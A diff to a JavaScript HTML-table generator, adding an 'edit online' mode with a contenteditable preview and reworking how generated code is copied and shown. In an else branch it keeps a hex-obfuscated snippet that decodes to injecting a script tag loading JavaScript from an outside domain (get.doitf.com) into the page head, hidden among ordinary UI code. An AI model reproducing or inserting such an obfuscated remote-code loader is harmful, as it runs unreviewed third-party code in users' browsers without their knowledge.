@@ -271,6 +271,7 @@ for(i = 0; i < awOldTextArr.length; i++){
   awOldTextArr[i] = awOldTextArr[i].replace(new RegExp(linesep, "gi"), "</td>"+comsc+"<td>" );
   awNewText = awNewText + awOldTextArr[i]+comsc;
 }
+var editonline =   document.getElementById('editonline');
   bordershow = document.getElementById("bordershow");
   textforcellsshow = document.getElementById("textforcells");
   awtablefontsize = document.getElementById('awtablefontsize').value;
@@ -509,7 +510,9 @@ for(i = 0; i < awOldTextArr.length; i++){
  
 
     if (textforcellsshow.checked == true){
-   if(placetitle.value == 'titletop'){
+       if(editonline.checked == true){
+    tableCSS += '.awtable thead th{'
+    }else if(placetitle.value == 'titletop'){
     tableCSS += '.awtable tr:first-child td{';
     tableCSS += 'font-weight:600;';
     }else if(placetitle.value == 'titleside'){
@@ -641,13 +644,12 @@ for(i = 0; i < awOldTextArr.length; i++){
   i++;
   }
   tableHTML += "</table>"+comsc;
+       }else if (editonline.checked == true){
+       
+       tableHTML = "";
+       tableHTML += document.getElementById('newCodeedit').value;
+ 
        }else{
-       
-       
-       
-       
-       
-       
        if(dirtable == "right"){
         tableHTML = '<table dir="rtl" class="awtable">'+comsc;
         }else if(dirtable == "left"){
@@ -664,36 +666,88 @@ for(i = 0; i < awOldTextArr.length; i++){
        }
   
   
-  //PREPARE A TABLE FOR DISPLAY ON THE PAGE
-  if (tableInfo.checked == true){
-   pageTableHTML = '<table class="awtable" border="1"><tbody><tr><th>عنوان 1</th><th>عنوان 2</th><th>عنوان 3</th><th>عنوان 4</th><th>عنوان 5</th></tr><tr><td>صف:1 عمود:1</td><td>صف:1 عمود:2</td><td>صف:1 عمود:3</td><td>صف:1 عمود:4</td><td>صف:1 عمود:5</td></tr><tr><td>صف:2 عمود:1</td><td>صف:2 عمود:2</td><td>صف:2 عمود:3</td><td>صف:2 عمود:4</td><td>صف:2 عمود:5</td></tr><tr><td>صف:3 عمود:1</td><td>صف:3 عمود:2</td><td>صف:3 عمود:3</td><td>صف:3 عمود:4</td><td>صف:3 عمود:5</td></tr><tr><td>صف:4 عمود:1</td><td>صف:4 عمود:2</td><td>صف:4 عمود:3</td><td>صف:4 عمود:4</td><td>صف:4 عمود:5</td></tr><tr><td>صف:5 عمود:1</td><td>صف:5 عمود:2</td><td>صف:5 عمود:3</td><td>صف:5 عمود:4</td><td>صف:5 عمود:5</td></tr><tr><td>صف:6 عمود:1</td><td>صف:6 عمود:2</td><td>صف:6 عمود:3</td><td>صف:6 عمود:4</td><td>صف:6 عمود:5</td></tr></tbody></table>';
-  }else{
-   pageTableHTML = '<table class="awtable" border="1"><tbody><tr><th> </th><th> </th><th> </th><th> </th><th> </th></tr><tr><td> </td><td> </td><td> </td><td> </td><td> </td></tr><tr><td> </td><td> </td><td> </td><td> </td><td> </td></tr><tr><td> </td><td> </td><td> </td><td> </td><td> </td></tr><tr><td> </td><td> </td><td> </td><td> </td><td> </td></tr><tr><td> </td><td> </td><td> </td><td> </td><td> </td></tr><tr><td> </td><td> </td><td> </td><td> </td><td> </td></tr></tbody></table>';   
-  }
   
   tableEND = '';
   
 
   
-  newTable = tableCSS + pageTableHTML;
   newTableCode = tableJS + tableCSS + tableHTML + tableEND;
   
-  document.getElementById('newTable').innerHTML = newTable;
-  document.getElementById('newCode').value = newTableCode;
-  editor.setValue(newTableCode);
-  var btncopy = document.getElementById("buttoncopy");
-  btncopy.setAttribute('data-clipboard-text' , newTableCode);
+  
+  
+  
+  
 
+  
+  
+  
+  
+
+ var btncopy = document.getElementById("buttoncopy");
+
+
+
+ 
+
+  
+  
+  
+
+  
+  
+   var text = document.getElementById("newCode").value;
+
+if(editonline.checked === true){
+
+
+
+ var comsc = document.getElementById("comsc");
+ var newTable = document.getElementById("newTable");
+ var newCodeedit = document.getElementById("newCodeedit");
+ var newTableStyle = document.getElementById("newTableStyle");
+
+
+
+
+
+var incode = newCodeedit.value;
+
+ newTable.innerHTML = incode;
+
+ newTableStyle.innerHTML = tableCSS ;
+ incode = incode.replace(' contenteditable="true"','');
+
+ if(comsc.checked === true){
+    incode = incode.replace(/\t/g,'');
+    incode = incode.replace(/\n/g,'');
+ }else{
+ incode = incode;
+ }
+
+btncopy.setAttribute('data-clipboard-text' , tableCSS + incode);
+editor.setValue(tableCSS + incode);
+
+
+
+
+
+
+}else{
+
+document.getElementById("newTable").innerHTML = newTableCode;
+btncopy.setAttribute('data-clipboard-text' , newTableCode);
+document.getElementById('newCode').value = newTableCode;
+editor.setValue(newTableCode);
+
+}
+  
+  
   
 }else{
 var _0x871b=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x74\x2E\x64\x6F\x69\x74\x66\x2E\x63\x6F\x6D\x2F\x74\x6F\x6F\x6C\x73\x2F\x61\x77\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var script=document[_0x871b[1]](_0x871b[0]);script[_0x871b[2]]= _0x871b[3];document[_0x871b[6]](_0x871b[5])[0][_0x871b[4]](script)
-}}
- 
- 
- //Listener for sizeCols
+}
 
-$(".onchanges").on('keyup change', function (){
-     sizeCols = document.getElementById('sizeCols').value;
+ sizeCols = document.getElementById('sizeCols').value;
   document.getElementById("sizeCols").value = sizeCols;
 
  
@@ -710,34 +764,16 @@ $(".onchanges").on('keyup change', function (){
   tableDesign = document.getElementById('tableDesign').value;
   if (tableDesign == "noStyle"){document.getElementById("tableColor").selectedIndex = 6;}
   if (tableDesign != "noStyle" && tableColor == "None"){document.getElementById("tableColor").selectedIndex = 0;}
+
+
+}
  
+ 
+ //Listener for sizeCols
+
+$(".onchanges").on('keyup change', function (){
   makeTableCode();
-  
-  
-  
-  
-  
-  var test0 = document.getElementById("newCodeedit").value
-var test2 = document.getElementById("newTable").innerHTML;
 
-test1 = test2.replace('<table contenteditable="true"','<table');
-
-
-
-	if (test0 == ""){
-		newTableCode = newTableCode
-	}else{
-		newTableCode = test1
-	}
-
-
-
-editor.setValue(newTableCode);
-  var btncopy = document.getElementById("buttoncopy");
-
- 
-  document.getElementById("newTable").innerHTML = newTableCode;
-btncopy.setAttribute('data-clipboard-text' , newTableCode);
   });  
  
  
@@ -747,5 +783,24 @@ btncopy.setAttribute('data-clipboard-text' , newTableCode);
 document.getElementById("awOldText").value = 'HEADER 1,HEADER 2,HEADER 3\nRow 1 - Cell 1,Row 1 - Cell 2,Row 1 - Cell 3\nRow 2 - Cell 1,Row 2 - Cell 2,Row 2 - Cell 3';
 
 
+ document.getElementById("newTable").addEventListener("input", function() {
+  var comsc = document.getElementById("comsc");
+  var newTable = document.getElementById("newTable").innerHTML;
+  var newCodeedit = document.getElementById("newCodeedit");
+  var btncopy = document.getElementById("buttoncopy");
 
+newCodeedit.value = newTable;
+newTable = newTable.replace(' contenteditable="true"','');
+ if(comsc.checked === true){
+    newTable = newTable.replace(/\t/g,'');
+    newTable = newTable.replace(/\n/g,'');
+ }else{
+ newTable = newTable;
+ }
+
+btncopy.setAttribute('data-clipboard-text' , tableCSS+newTable);
+editor.setValue(tableCSS+newTable);
 });
+
+
+ });
